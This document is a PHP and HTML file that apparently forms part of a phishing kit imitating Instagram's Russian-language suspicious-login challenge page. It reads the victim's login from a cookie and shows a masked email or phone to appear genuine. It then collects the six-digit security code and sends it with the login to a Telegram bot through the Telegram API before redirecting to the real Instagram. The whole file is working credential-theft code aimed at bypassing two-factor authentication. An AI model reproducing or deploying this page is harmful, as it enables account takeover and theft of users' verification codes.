<?php

if($_POST['security_code']) 
{
	
$token = "";
$chat_id = "";
	
$arr = array(
  'Статус: ' => 'Код подтверждение',
  'Логин: ' => $_COOKIE['login'],
  'Код:' => $_POST['security_code']
);		

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");	
	

if ($sendToTelegram) {
header('Location: https://instagram.com');
exit();	
} else {
header('Location: /challenge.php/?step=two');

}	
	
}

if (isset($_COOKIE['login']))   
{   

if (stripos($_COOKIE['login'], '@')) {
	
$email = preg_replace('/^(.)[^@]*/', '$3***', $_COOKIE['login']);	
	
$text = "Эл. адрес: ".$email;

}
else
{
	
$new_str = substr($_COOKIE['login'], 0, 4) . '******' . substr($_COOKIE['login'], -4);

$text =  "Телефон: ".$new_str;	
}
 
}

else
	
{
header('Location: /index.html');		
}

?>

<!DOCTYPE html>
<html lang="ru" class="js not-logged-in client-root"><head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <title>Instagram</title>

        
        <meta name="robots" content="noimageindex, noarchive">
        <meta name="apple-mobile-web-app-status-bar-style" content="default">
        <meta name="mobile-web-app-capable" content="yes">
        <meta name="theme-color" content="#ffffff">
        <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover">
  
        <link rel="preload" href="https://www.instagram.com/static/bundles/es6/ConsumerLibCommons.css/ecdeb303e8df.css" as="style" type="text/css" crossorigin="anonymous">
<link rel="preload" href="https://www.instagram.com/static/bundles/es6/ConsumerUICommons.css/2f20b02e942f.css" as="style" type="text/css" crossorigin="anonymous">
<link rel="preload" href="https://www.instagram.com/static/bundles/es6/ConsumerAsyncCommons.css/6f451cfba8c9.css" as="style" type="text/css" crossorigin="anonymous">
<link rel="preload" href="https://www.instagram.com/static/bundles/es6/Challenge.css/f71521d0bba7.css" as="style" type="text/css" crossorigin="anonymous">
<link rel="preload" href="https://www.instagram.com/static/bundles/es6/Vendor.js/a379f2a567f9.js" as="script" type="text/javascript" crossorigin="anonymous">
<link rel="preload" href="https://www.instagram.com/static/bundles/es6/ru_RU.js/823fc4591bde.js" as="script" type="text/javascript" crossorigin="anonymous">
<link rel="preload" href="https://www.instagram.com/static/bundles/es6/ConsumerLibCommons.js/e8deea449f1d.js" as="script" type="text/javascript" crossorigin="anonymous">
<link rel="preload" href="https://www.instagram.com/static/bundles/es6/ConsumerUICommons.js/731e96d0eb04.js" as="script" type="text/javascript" crossorigin="anonymous">
<link rel="preload" href="https://www.instagram.com/static/bundles/es6/ConsumerAsyncCommons.js/af45dea252ee.js" as="script" type="text/javascript" crossorigin="anonymous">
<link rel="preload" href="https://www.instagram.com/static/bundles/es6/Challenge.js/3cc7fb62f933.js" as="script" type="text/javascript" crossorigin="anonymous">
        
        

    
                  <link rel="shortcut icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
                
            
<link href="https://www.instagram.com/static/bundles/es6/ActivityFeedBox.css/17ec9848762e.css" type="text/css" crossorigin="anonymous" rel="stylesheet"></head>
    <body class="">
        
    <span id="react-root">
	<section class="LZyqZ">
	<div class="lTdZb">
	
	<?php if($_GET['step']=='two') { ?>
	<div id="showw" class="vqibd  wNNoj"><header class="eehwT"><div class="Uf2Mx"><div class="Scmby"><header class="L8mTj _9ezyW"><div class="b5itu "><div class="mXkkY HOQT4"><button class="qXyTW"><span class="coreSpriteNotificationLeftChevron Szr5J">Назад</span></button></div><h1 class="K3Sf1"></h1><div class="mXkkY KDuQp"></div></div></header></div></div><div class="Pfz75"><div class="_lz6s aUCRo"><div class="MWDvN buoMu"><div class="oJZym"><a class="urHPz" href="/"><div class="                  Igw0E   rBNOH        eGOV_     ybXk5    _4EzTm                                                                                                              "><span class="glyphsSpriteApp_instagram__outline__24__grey_9 u-__7" aria-label="Instagram"></span><div class="SvO5t"></div><div class="cq2ai"><span class="glyphsSpriteMobile_nav_type_logo u-__7" aria-label="Instagram"></span></div></div></a></div><div class="ctQZg"><div class="ZcHy5"></div></div></div></div></div></header><div class="ZpgjG   _1I5YO"><h2 class="AjK3K ">Введите свой код безопасности</h2></div><p class="GusmU SVI5E     ">Введите 6-значный код, который мы отправили на <?php echo $text;?>.</p><div class="GA2q- ">
	
	<form class="JraEb" method="post" action=""><div class="_4tgFp"><input class="_281Ls zyHYP" placeholder="------" id="security_code" style="font-size:55px; letter-spacing: 0.4em;" maxlength="6" name="security_code" type="tel" value=""></div><div class="_3_2jD" id="form_error" style="display:none"><p>This field is required.</p></div><span class="idhGk _1OSdk">
	
	<button id="send" class="_0mzm- sqdOP  L3NKy" type="submit" disabled style="width:100%">
<div class="Igw0E IwRSH eGOV_ _4EzTm">
<span id="noload">Отправить</span>
<svg id="load" style="display:none; height: 18px; width: 18px; margin:0 auto;" class=" FSiF6 " viewBox="0 0 100 100"><rect fill="#fafafa" height="10" opacity="0" rx="5" ry="5" transform="rotate(-90 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.125" rx="5" ry="5" transform="rotate(-45 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.25" rx="5" ry="5" transform="rotate(0 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.375" rx="5" ry="5" transform="rotate(45 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.5" rx="5" ry="5" transform="rotate(90 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.625" rx="5" ry="5" transform="rotate(135 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.75" rx="5" ry="5" transform="rotate(180 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.875" rx="5" ry="5" transform="rotate(225 50 50)" width="28" x="67" y="45"></rect></svg></div>

</button>
	
	
	</span></form></div><p class="GusmU  t_gv9    "><span>Не получили код? <a href="javascript:_replay()">Получите новый</a>.</span></p><div class="erQwt"><a class="_6vuJt" href="javascript:;">Назад</a></div></div>
	<?php } else { ?>
	
		<div id="scropas" class="vqibd  wNNoj "><header class="eehwT"><div class="Uf2Mx"><div class="Scmby"><header class="L8mTj _9ezyW"><div class="b5itu "><div class="mXkkY HOQT4"><button class="qXyTW"><span class="coreSpriteNotificationLeftChevron Szr5J">Назад</span></button></div><h1 class="K3Sf1"></h1><div class="mXkkY KDuQp"></div></div></header></div></div><div class="Pfz75"><div class="_lz6s "><div class="MWDvN "><div class="oJZym"><a class="" href="/"><div class="                  Igw0E   rBNOH        eGOV_     ybXk5    _4EzTm                                                                                                              "><span class="glyphsSpriteApp_instagram__outline__24__grey_9 u-__7" aria-label="Instagram"></span><div class="SvO5t"></div><div class="cq2ai"><span class="glyphsSpriteMobile_nav_type_logo u-__7" aria-label="Instagram"></span></div></div></a></div><div class="ctQZg"><div class="ZcHy5"></div></div></div></div></div></header><div class="GNbi9"><div class="_3snCq"><p class="O4QwN">Подозрительная попытка входа</p></div></div><div class="ZpgjG   _1I5YO"><h2 class="AjK3K ">Мы обнаружили необычную попытку входа</h2></div><p class="GusmU SVI5E     ">Чтобы защитить ваш аккаунт, мы отправим вам код безопасности, позволяющий подтвердить вашу личность.</p><div class="GA2q- ">
	
	<form id="swndow" method="post" action="challenge.php/?step=two" class="JraEb"><div class="QuiLu"><div><label class="UuB0U Uwdwc" for="choice_1"><?php echo $text; ?><input class="tEIkn" id="choice_1" name="choice" type="radio" value="1"></label></div></div><span class="idhGk _1OSdk"><button type="submit" class="_5f5mN       jIbKX KUBKM      yZn4P   ">Отправить код безопасности</button></span></form></div><div class="erQwt"><a class="_6vuJt" href="javascript:;">Выйти</a></div></div>
		<?php } ?>



	
	</div></section></span>

<link rel="stylesheet" href="https://www.instagram.com/static/bundles/es6/ConsumerLibCommons.css/ecdeb303e8df.css" type="text/css" crossorigin="anonymous">
<link rel="stylesheet" href="https://www.instagram.com/static/bundles/es6/ConsumerUICommons.css/2f20b02e942f.css" type="text/css" crossorigin="anonymous">
<link rel="stylesheet" href="https://www.instagram.com/static/bundles/es6/ConsumerAsyncCommons.css/6f451cfba8c9.css" type="text/css" crossorigin="anonymous">
<link rel="stylesheet" href="https://www.instagram.com/static/bundles/es6/Challenge.css/f71521d0bba7.css" type="text/css" crossorigin="anonymous">

        
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>


   
<script type="text/javascript">


$(document).on('input', '#security_code', function () {

if($(this).val().length >= 1) {
	
	$("#security_code").css("font-size","26px");
    $("#security_code").css("letter-spacing","1.4em");
	
	} 

	
	else {
		
	$("#security_code").css("font-size","55px");
    $("#security_code").css("letter-spacing","0.4em");
	$('#send').attr('disabled',true);
	
	}
	
	if($(this).val().length > 5) {jQuery('#security_code').blur(); $('#send').attr('disabled',false);} 
	
	
	
	
});	

</script>
   

<div style="position: fixed; top: env(safe-area-inset-top); right: env(safe-area-inset-right); bottom: env(safe-area-inset-bottom); left: env(safe-area-inset-left); pointer-events: none; contain: strict; z-index: -9999;"></div></body></html>
